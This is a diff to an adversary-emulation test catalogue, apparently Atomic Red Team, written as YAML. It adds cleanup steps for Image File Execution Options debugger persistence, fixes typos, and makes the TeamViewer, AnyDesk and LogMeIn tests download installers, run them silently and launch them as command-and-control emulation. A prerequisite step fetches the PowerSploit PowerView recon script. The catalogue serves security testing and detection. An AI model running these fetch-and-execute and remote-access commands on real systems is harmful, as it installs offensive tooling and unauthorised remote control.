@@ -341,6 +341,13 @@ privilege-escalation:
           -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
           \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
           $Value\n  }\n}\n"
+        cleanup_command: |
+          $input_table = "#{parent_list}".split(",")
+          Foreach ($item in $input_table)
+          {
+            $item = $item.trim()
+            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
+          }
         name: powershell
         elevation_required: true
   T1546.009:
@@ -8031,6 +8038,13 @@ persistence:
           -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n
           \ }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value
           $Value\n  }\n}\n"
+        cleanup_command: |
+          $input_table = "#{parent_list}".split(",")
+          Foreach ($item in $input_table)
+          {
+            $item = $item.trim()
+            reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
+          }
         name: powershell
         elevation_required: true
   T1098:
@@ -24487,7 +24501,7 @@ defense-evasion:
     - name: FSUtil
       auto_generated_guid: b4115c7a-0e92-47f0-a61e-17e7218b2435
       description: |
-        Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon exectuion, no output
+        Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output
         will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
       supported_platforms:
       - windows
@@ -35616,8 +35630,9 @@ discovery:
         get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
           -OutFile "$env:TEMP\PowerView.ps1"
       - description: RSAT PowerShell AD admin cmdlets must be installed
-        prereq_command: if ((Get-Command "Get-ADDomain") -And (Get-Command "Get-ADGroupMember"))
-          { exit 0 } else { exit 1 }
+        prereq_command: if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And
+          (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else {
+          exit 1 }
         get_prereq_command: Write-Host "Sorry RSAT must be installed manually"
       executor:
         command: |
@@ -44580,7 +44595,7 @@ command-and-control:
     - name: Testing usage of uncommonly used port with PowerShell
       auto_generated_guid: 21fe622f-8e53-4b31-ba83-6d333c2583f4
       description: |
-        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon exectuion, details about the successful
+        Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful
         port check will be displayed.
       supported_platforms:
       - windows
@@ -44953,7 +44968,13 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
-          C:\Users\$env:username\Desktop\TeamViewer_Setup.exe
+          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+          Start-Process $file1 /S;
+          Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
+        cleanup_command: |-
+          Start-Process 'C:\Program Files (x86)\TeamViewer\uninstall.exe' "/S"
+          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
     - name: AnyDesk Files Detected Test on Windows
@@ -44968,7 +44989,11 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
-          C:\Users\$env:username\Desktop\AnyDesk.exe
+          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
+          Start-Process $file1 /S;
+        cleanup_command: |-
+          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe.exe"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
     - name: LogMeIn Files Detected Test on Windows
@@ -44983,7 +45008,13 @@ command-and-control:
       executor:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
-          C:\Users\$env:username\Desktop\LogMeInIgnition.msi
+          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+          Start-Process $file1 /S;
+          Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
+        cleanup_command: |-
+          get-package *'LogMeIn Client'* | uninstall-package
+          $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
+          Remove-Item $file1
         name: powershell
         elevation_required: true
   T1132.001:
